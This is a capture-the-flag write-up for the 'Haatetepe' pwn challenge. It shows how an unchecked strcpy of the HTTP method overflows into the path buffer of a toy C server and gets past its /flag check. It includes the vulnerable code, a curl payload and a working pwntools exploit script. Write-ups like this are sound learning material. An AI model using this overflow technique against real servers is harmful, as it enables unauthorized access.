# Haatetepe – NNS CTF 2025 (PWN)

## Challenge description
> *"The best haatetepe server in Norway comes with speed, small size and modular routing. I've disabled the /flag route for now, though. Check out the server and let me know what you think! I haven't done any benchmarks, but I bet it's faster than NGINX, and it uses less than 1MB memory! It's in its (very) early stages, but I'm planning on implementing the rest of the HTTP header specification when I get time. Thanks for stopping by! "*  

We are given a simple HTTP server written in C (`main.c`). It implements minimal request parsing and routing:
- Supports `GET` and `HEAD` requests.
- Has a route `/flag` that calls `serve_flag()`, which directly returns the flag from the environment.
- **BUT**: `parse_request()` blocks direct access by rejecting any request where the path is `/flag`.

So the goal is to bypass the `/flag` check and trick the server into serving it.

---

## Vulnerable code

```c
int parse_request(http_request_header_t *req, char *buf) {
  char version_str[16];
  char method_str[16];
  char path[256];
  char *header[3];

  // split "METHOD PATH HTTP/VERSION"
  ...

  strncpy(version_str, header[2], sizeof(version_str) - 1);
  strncpy(path, header[1], sizeof(req->path) - 1);

  // don't even think about it
  if (strcmp(path, "/flag") == 0) {
    return -1;
  }

  strcpy(method_str, header[0]);   // <-- VULN
  req->method = parse_method(method_str);
  strcpy(req->path, path);
  ...
}
```

The bug:

- `method_str` is only 16 bytes.
- `strcpy(method_str, header[0])` allows arbitrary-length methods → buffer overflow.
- The overflow **smashes into the local variable `path`**, overwriting it after the `/flag` check has already happened.

## Vulnerability

Because `path` is re-copied into `req->path` **after** the overflow, we can do this:

1. Send a very long "method" string:  
    `"GET" + "A"*13 + "/flag"`  
    → `"GET"+"A"*13` is exactly 16 bytes (fills `method_str`),  
    → The next bytes overwrite `path` with `"/flag"`.
2. The initial check (`if (strcmp(path, "/flag") == 0)`) passes because `path` still contained the harmless `/`.
3. After overflow, `path` now equals `"/flag"`.
4. `req->path = "/flag"` is routed normally → `serve_flag()` returns the flag!

This is a **classic stack smash between local variables**.

## Exploit

We can exploit it with a raw `curl`:
```bash
curl -v -X 'GETAAAAAAAAAAAAA/flag' http://target:8000/
```

But here’s a pwntools script to automate it:
```python
#!/usr/bin/env python3
from pwn import *
import re

HOST = "87f4cc2f-1394-4918-9292-46bd7fa5714f.chall.nnsc.tf"
PORT = 41337

def main():
    context.log_level = "info"

    # "GET" + "A"*13 = 16 bytes → overflow starts
    method = "GET" + "A" * 13 + "/flag"

    req = (
        f"{method} / HTTP/1.1\r\n"
        f"Host: {HOST}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    )

    io = remote(HOST, PORT, ssl=True)
    io.send(req.encode())

    resp = io.recvall(timeout=5).decode(errors="ignore")
    io.close()

    print("=== Raw response ===")
    print(resp)

    m = re.search(r"Flag:\s*([^\s]+)", resp)
    if m:
        print(f"\n[+] Flag found: {m.group(1)}")

if __name__ == "__main__":
    main()
```
